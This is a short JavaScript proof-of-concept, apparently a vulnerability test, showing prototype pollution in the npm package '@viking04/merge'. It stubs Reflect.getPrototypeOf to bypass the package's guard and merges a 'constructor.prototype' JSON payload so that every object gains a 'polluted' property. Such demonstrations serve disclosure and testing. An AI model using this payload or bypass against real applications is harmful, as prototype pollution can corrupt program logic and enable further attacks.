Reflect.getPrototypeOf = () => false;
const merge = require('@viking04/merge');
console.log({}.polluted);
let a = {};
var prototype_pollution_test = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
merge(a, prototype_pollution_test);
console.log({}.polluted);